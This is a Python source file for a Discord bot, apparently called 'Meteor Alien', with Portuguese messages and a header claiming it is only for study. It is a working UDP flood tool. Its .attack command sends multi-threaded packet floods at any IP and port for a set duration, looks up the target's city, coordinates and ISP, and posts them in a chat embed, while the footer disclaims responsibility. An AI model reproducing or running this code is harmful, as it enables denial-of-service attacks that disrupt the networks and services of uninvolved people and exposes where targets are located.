

#/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////#
#                                                                                                                                                                             #
#                                        ISSO É APENAS UM TESTE!!! NÃO REFLETE RISCO REAL PARA NENHUMA ORGANIZAÇÃO OU ENTIDADE PÚBLICA!!!                                     #
#                                                  PROJETO CRIADO ***APENAS*** COMO FORMA DE ESTUDO E FINS EDUCATIVOS.                                                        #
#/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////#


import discord
from discord.ext import commands
from time import time, sleep
from threading import Thread
from socket import socket, AF_INET, SOCK_DGRAM
from random import randint
import requests

intents = discord.Intents.default()
intents.message_content = True 

bot = commands.Bot(command_prefix='.', intents=intents)

class Attack:
    def __init__(self, ip, port, force, threads, duration):
        self.ip = ip
        self.port = port
        self.force = force
        self.threads = threads
        self.duration = duration
        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)
        self.on = False
        self.sent = 0
        self.total = 0

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()

        Thread(target=self.stop_after_duration).start()

    def stop_after_duration(self):
        sleep(self.duration)
        self.stop()

    def info(self):
        interval = 0.05
        now = time()

        size = 0

        bytediff = 8
        mb = 1000000
        gb = 1000000000

        while self.on:
            sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(
                    f"Size: {size} Mb/s - Total: {self.total:.1f} Gb. {' '*20}",
                    end="\r",
                )

            now2 = time()

            if now + 1 >= now2:
                continue

            size = round(self.sent * bytediff / mb)
            self.sent = 0

            now += 1

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except:
                pass

    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)

attacks = {}

@bot.event
async def on_ready():
    print(f'O bot {bot.user} está online.')

@bot.command()
async def attack(ctx, ip: str, port: int, force: int, threads: int, duration: int):

    data = requests.get(f"http://ipwhois.app/json/{ip}").json()

    if ip in attacks:

        embed = discord.Embed(title="ㅤㅤㅤㅤㅤㅤㅤㅤㅤAtenção!ㅤㅤㅤㅤㅤㅤㅤㅤㅤ", description=f"Um ataque __já está sendo executado__ no IP `{ip}`!\nNão posso prosseguir com a solicitação de enviar um novo ataque.\n\nUse o comando `./stop {ip}` para pausar o ataque.")
        embed.set_author(name=f'', icon_url='')
        embed.set_footer(text='Failed attack attempt sent by {}\nAlienzada teste © All Rights Reserved'.format(ctx.author), icon_url='')

        await ctx.send(embed=embed)
        return
    
    attack = Attack(ip, port, force, threads, duration)
    attack.flood()
    attacks[ip] = attack
    
    top_ports = {
        20: "FTP (Data transfer)",
        21: "FTP (Control)",
        22: "SSH",
        23: "Telnet",
        25: "SMTP",
        53: "DNS",
        69: "TFTP",
        80: "HTTP",
        110: "POP3",
        119: "NNTP",
        123: "NTP",
        135: "RPC",
        137: "NetBIOS Name",
        138: "NetBIOS Datagram",
        139: "NetBIOS Session",
        143: "IMAP",
        161: "SNMP",
        179: "BGP",
        194: "IRC",
        443: "HTTPS",
        445: "SMB",
        465: "SMTPS",
        514: "Syslog",
        515: "LPD",
        587: "SMTP (Submission)",
        636: "LDAPS",
        873: "rsync",
        989: "FTPS (Data)",
        990: "FTPS (Control)",
        993: "IMAPS",
        995: "POP3S",
        1080: "SOCKS",
        1194: "OpenVPN",
        1433: "MSSQL",
        1521: "Oracle DB",
        1723: "PPTP",
        1812: "RADIUS",
        2049: "NFS",
        2082: "cPanel",
        2083: "cPanel (SSL)",
        2086: "WHM",
        2087: "WHM (SSL)",
        2222: "DirectAdmin",
        2375: "Docker (Default)",
        3306: "MySQL",
        3389: "RDP",
        3690: "Subversion",
        4321: "RWhois",
        5353: "mDNS",
        5432: "PostgreSQL",
        5672: "AMQP (RabbitMQ)",
        5800: "VNC (Web Interface)",
        5900: "VNC",
        5984: "CouchDB",
        6379: "Redis",
        6667: "IRC",
        8000: "HTTP (Alternate)",
        8080: "HTTP (Alternate)",
        8443: "HTTPS (Alternate)",
        8888: "HTTP (Alternate)",
        9100: "JetDirect Printing",
        9418: "Git",
        10000: "Webmin",
        11211: "Memcached",
        25565: "Minecraft",
        27017: "MongoDB",
        32400: "Plex Media Server",
        44818: "EtherNet/IP",
        50000: "ASP.NET Debugging",
        62078: "iTunes Sync"
    }

    service = top_ports.get(port, "Serviço desconhecido")
    
    validateAsn = data["asn"] if data["asn"] != "" else "SEM INFORMAÇÃO"
    validateOrg = data["org"] if data["org"] != "" else "SEM INFORMAÇÃO"
    
    country_flag = f":flag_{data['country_code'].lower()}:"

    embed = discord.Embed(title='ㅤㅤㅤㅤㅤㅤㅤㅤMeteor Alien ☄️ ', description=f"O ataque foi enviado com **SUCESSO** para o `{ip}` na porta `{port} ({service})`")

    embed.add_field(name="", value="", inline=False)
    embed.add_field(name="IP", value=f'`{ip}`', inline=True)
    embed.add_field(name="Porta de destino", value=f'`{port} ({service})`', inline=True)
    embed.add_field(name="Bytes por pacotes", value=f'`{force}` Bytes/pacote', inline=True)
    embed.add_field(name="Número de Threads", value=f'`{threads}` threads', inline=True)
    embed.add_field(name="Tempo de expiração", value=f'`{duration}` segundos', inline=True)
    embed.add_field(name="Status do ataque", value="Em andamento!", inline=True)
    embed.add_field(name="", value="", inline=False)
    embed.add_field(name="", value="", inline=False)
    embed.add_field(name="Other Information", value="\n\n", inline=False)
    embed.add_field(name="", value="", inline=False)
    embed.add_field(name="", value="", inline=False)
    embed.add_field(name="IP", value=data['ip'], inline=True)
    embed.add_field(name="Tipo de IP", value=data['type'], inline=True)
    embed.add_field(name="Cidade", value=data['city'], inline=True)
    embed.add_field(name="Estado", value=data['region'], inline=True)
    embed.add_field(name="País", value=data['country'], inline=True)
    embed.add_field(name="Continente", value=data["continent"], inline=True)
    embed.add_field(name="Bandeira do País", value=country_flag, inline=True)
    embed.add_field(name="Latitude", value=data['latitude'], inline=True)
    embed.add_field(name="Longitude", value=data['longitude'], inline=True)
    embed.add_field(name="Provedor", value=data['isp'], inline=True)
    embed.add_field(name="ASN", value=validateAsn, inline=True)
    embed.add_field(name="Organização", value=validateOrg, inline=True)
    
    embed.set_author(name='', icon_url='')
    embed.set_image(url="https://gifdb.com/images/high/peaky-blinders-thomas-shelby-agree-qcb7t54uxjebsfnq.gif")
    embed.set_footer(text="Attack Sent By {}\nMeteor Alien ☄️ © All Rights Reserved\nNão nos responsabilizamos pelos seus atos.".format(ctx.author), icon_url='', )
    await ctx.send(embed=embed)

@bot.command()
async def stop(ctx, ip: str):
    if ip not in attacks:

        embed = discord.Embed (title="", description="")

        embed.set_author(name=f"Nenhum ataque em andamento para o IP {ip}", icon_url="")
        embed.add_field(name="", value="", inline=False)

        await ctx.send(embed=embed)

        return
    
    attack = attacks[ip]
    attack.stop()
    del attacks[ip]
    
    embed = discord.Embed (title="", description="")

    embed.set_author(name=f"Ataque pausado no IP {ip}.", icon_url="")
    embed.add_field(name="", value="", inline=False)

    await ctx.send(embed=embed)

bot.run('')